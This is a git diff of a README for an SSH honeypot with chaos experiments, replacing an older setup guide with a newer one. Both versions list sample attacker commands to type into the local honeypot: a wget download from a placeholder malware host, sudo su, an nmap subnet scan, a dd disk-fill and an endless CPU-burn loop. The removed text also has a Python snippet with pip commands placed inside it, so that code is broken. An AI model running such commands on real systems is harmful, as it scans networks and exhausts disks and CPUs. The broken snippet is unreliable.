@@ -1,227 +1,86 @@
+# Honeypot Chaos Engine
 
+Adaptive SSH honeypot with threat detection, chaos experiments, learning-based retest logic, and a React dashboard.
 
-# 1️⃣ System Requirements
+## What This Project Includes
 
-Sesh must have:
+- SSH honeypot on `127.0.0.1:2222`
+- Rule + AI threat classification
+- Threat to experiment mapping (`cpu_stress`, `memory_stress`, `disk_io`, `process_disruption`)
+- Chaos execution inside Docker container (`chaos-executor`)
+- Metrics + adaptive learning stored in SQLite
+- FastAPI backend (`http://127.0.0.1:8000`)
+- React dashboard (Vite)
 
-* Python **3.10+**
-* Git
-* SSH client (already available on Linux/macOS and Windows PowerShell)
+## Prerequisites
 
-Check Python:
+Install these on the target system first:
 
-```bash
-python --version
-```
+- Python 3.10+ (recommended 3.10/3.11)
+- Git
+- Docker Desktop (or Docker Engine) with daemon running
+- Node.js 18+ and npm (for dashboard)
+- OpenSSH client (usually preinstalled)
 
----
-
-# 2️⃣ Clone the Repository
-
-On his laptop:
+## 1. Clone
 
 ```bash
 git clone <your-repo-url>
 cd honeypot-choas
 ```
 
----
+## 2. Python Environment
 
-# 3️⃣ Create Virtual Environment (Recommended)
-
-Linux / macOS:
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-Windows:
+Windows (PowerShell):
 
 ```powershell
 python -m venv venv
 venv\Scripts\activate
-```
-
----
-
-# 4️⃣ Install Required Packages
-
-Create a file in the root:
-
-```
-requirements.txt
-```
-
-Add:
-
-```txt
-paramiko
-```
-
-Then install:
-
-```bash
+pip install --upgrade pip
 pip install -r requirements.txt
 ```
 
-SQLite does **not** need installation because it is included in Python.
-
----
-
-# 5️⃣ Configure Database Path
-
-In your project you already use:
-
-```python
-DATABASE_PATH
-```
-
-Ensure `core/config.py` contains something like:
-
-```python
-import os
-
-BASE_DIR = os.path.dirname(os.path.dirname(__file__))
-
-DATABASE_PATH = os.path.join(BASE_DIR, "database", "honeypot.db")
-
-SSH_HOST = "127.0.0.1"
-SSH_PORT = 2222
-
-MAX_COMMAND_LENGTH = 512
-SESSION_TIMEOUT_SECONDS = 300
-```
-
----
-
-# 6️⃣ Create the Database
-
-Inside project root:
-
-```
-database/
-```
-
-Create file:
-
-```
-database/init_db.py
-```
-
-Use this code:
-
-```python
-import sqlite3
-from core.config import DATABASE_PATH
-
-pip install dotenv
-pip install paramiko
-pip install psutil
-pip install openai
-pip install uvicorn
-pip install fastapi
-
-SCHEMA = """
--- SESSIONS
-CREATE TABLE IF NOT EXISTS sessions (
-    session_id TEXT PRIMARY KEY,
-    sensor_id TEXT DEFAULT 'local-node-1',
-    source_ip TEXT NOT NULL,
-    start_time DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
-    end_time DATETIME,
-    duration_secs INTEGER,
-    total_commands INTEGER DEFAULT 0,
-    status TEXT DEFAULT 'active' CHECK (status IN ('active', 'closed', 'timeout'))
-);
-
--- COMMANDS
-CREATE TABLE IF NOT EXISTS commands (
-    command_id INTEGER PRIMARY KEY AUTOINCREMENT,
-    session_id TEXT NOT NULL,
-    raw_input TEXT NOT NULL,
-    parsed_command TEXT,
-    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
-    response_type TEXT CHECK (response_type IN ('rule','ai','unknown')),
-    response_text TEXT,
-    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
-);
-
--- THREATS
-CREATE TABLE IF NOT EXISTS threats (
-    threat_id INTEGER PRIMARY KEY AUTOINCREMENT,
-    session_id TEXT NOT NULL,
-    command_id INTEGER NOT NULL,
-    threat_type TEXT NOT NULL,
-    severity TEXT NOT NULL DEFAULT 'Low' CHECK (severity IN ('Low','Medium','High')),
-    confidence REAL NOT NULL DEFAULT 1.0,
-    source TEXT DEFAULT 'rule' CHECK (source IN ('rule','ai')),
-    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
-    processed INTEGER NOT NULL DEFAULT 0 CHECK (processed IN (0,1)),
-    FOREIGN KEY (session_id) REFERENCES sessions(session_id),
-    FOREIGN KEY (command_id) REFERENCES commands(command_id)
-);
-
--- CHAOS RESULTS
-CREATE TABLE IF NOT EXISTS chaos_results (
-    experiment_id INTEGER PRIMARY KEY AUTOINCREMENT,
-    threat_id INTEGER NOT NULL,
-    experiment_type TEXT NOT NULL CHECK (experiment_type IN ('cpu_stress','memory_stress','disk_io')),
-    intensity_level INTEGER DEFAULT 1,
-    cpu_peak REAL,
-    memory_peak REAL,
-    disk_io_peak REAL,
-    duration_secs INTEGER,
-    recovery_time_secs REAL,
-    result TEXT CHECK (result IN ('Resilient','Vulnerable')),
-    started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    completed_at DATETIME,
-    notes TEXT,
-    FOREIGN KEY (threat_id) REFERENCES threats(threat_id)
-);
-
--- ADAPTIVE SCORES
-CREATE TABLE IF NOT EXISTS adaptive_scores (
-    session_id TEXT NOT NULL,
-    threat_type TEXT NOT NULL,
-    occurrence_count INTEGER DEFAULT 0,
-    current_severity TEXT DEFAULT 'Low',
-    chaos_intensity_level INTEGER DEFAULT 1,
-    escalation_triggered INTEGER DEFAULT 0,
-    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
-    PRIMARY KEY (session_id, threat_type),
-    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
-);
-"""
-
-conn = sqlite3.connect(DATABASE_PATH)
-conn.executescript(SCHEMA)
-conn.close()
-
-print("Database initialized successfully.")
-```
-
----
-
-# 7️⃣ Initialize Database
-
-Run once:
+Linux/macOS:
 
 ```bash
-python database/init_db.py
+python3 -m venv venv
+source venv/bin/activate
+pip install --upgrade pip
+pip install -r requirements.txt
 ```
 
-This will create:
+## 3. Environment Variables (`.env`)
 
+Create a `.env` file in project root:
+
+```env
+# Optional but recommended for AI fallback
+GROK_API_KEY=your_groq_api_key
+
+# Optional API override
+API_HOST=127.0.0.1
+API_PORT=8000
 ```
-database/honeypot.db
+
+If `GROK_API_KEY` is missing, the project still runs (AI fallback becomes disabled).
+
+## 4. Build Chaos Docker Image
+
+Build once:
+
+```bash
+docker build -f Dockerfile.chaos -t chaos-executor .
 ```
 
-with all tables.
+Verify:
 
----
+```bash
+docker images
+```
 
-# 8️⃣ Start the Honeypot
+You should see `chaos-executor`.
+
+## 5. Start Backend + SSH Honeypot
 
 From project root:
 
@@ -229,87 +88,94 @@ From project root:
 python -m core.main
 ```
 
-You should see:
+This starts:
 
+- DB initialization/migrations
+- chaos watcher
+- FastAPI backend on `http://127.0.0.1:8000`
+- SSH honeypot on `127.0.0.1:2222`
+
+## 6. Start Dashboard
+
+In a new terminal:
+
+```bash
+cd dashboard
+npm install
+npm run dev
 ```
-SSH Honeypot running on 127.0.0.1:2222
-```
 
----
+Open the URL shown by Vite (usually `http://localhost:5173`).
 
-# 9️⃣ Connect to Honeypot
+## 7. Connect to Honeypot
 
-Open another terminal:
+In another terminal:
 
 ```bash
 ssh root@127.0.0.1 -p 2222
 ```
 
-Example commands:
+Try commands like:
 
-```
-ls
-mkdir test
-cd test
-pwd
-wget http://malware.com
-sudo su
-```
+- `nmap -sS -T4 192.168.1.0/24 2>/dev/null`
+- `dd if=/dev/zero of=/tmp/fill bs=1M count=5000`
+- `while true; do openssl speed rsa2048 > /dev/null; done &`
 
-These will be logged in the database.
+## 8. Database Location
 
----
+SQLite file:
 
-# 🔟 Verify Database Logging
+- `database/honeypot.db`
 
-He can check using Python:
+Useful tables:
 
-```python
-import sqlite3
-conn = sqlite3.connect("database/honeypot.db")
-cursor = conn.cursor()
+- `sessions`
+- `commands`
+- `threats`
+- `chaos_results`
+- `adaptive_scores`
+- `global_threat_stats`
 
-cursor.execute("SELECT raw_input FROM commands")
-print(cursor.fetchall())
+## 9. Quick Troubleshooting
 
-conn.close()
-```
+- Docker metrics show fallback/0:
+  - Ensure Docker Desktop is running.
+  - Ensure `chaos-executor` image exists.
+- Dashboard says API not reachable:
+  - Confirm `python -m core.main` is running.
+  - Check `http://127.0.0.1:8000/api/overview`.
+- SSH disconnect/session timeout:
+  - Default timeout is `300s` in `core/config.py`.
 
----
+## 10. Project Structure
 
-# 1️⃣1️⃣ Important Notes for Sesh
-
-* Each SSH session creates its **own virtual filesystem**
-* Commands are logged in **commands table**
-* Threats appear in **threats table**
-* Chaos engine will later read **unprocessed threats**
-
----
-
-# 📦 What You Should Add to Repo
-
-Your repository should contain:
-
-```
-honeypot-choas
-│
-├── core/
-├── database/
-│   └── init_db.py
-├── requirements.txt
-└── README.md
-```
-
----
-
-# ⭐ Recommendation (Important)
-
-Add to `.gitignore`:
-
-```
-database/honeypot.db
-__pycache__/
-venv/
+```text
+honeypot-choas/
+  core/
+    api/
+    chaos/
+    database/
+    intelligence/
+    ssh/
+    main.py
+  dashboard/
+    src/
+    package.json
+  database/
+    schema.sql
+    honeypot.db
+  Dockerfile.chaos
+  requirements.txt
+  README.md
 ```
 
-Because the DB should **not be committed to GitHub**.
+## 11. Git Ignore Recommendations
+
+Keep these out of Git:
+
+- `venv/`
+- `database/honeypot.db`
+- `dashboard/node_modules/`
+- `.env`
+- `__pycache__/`
+
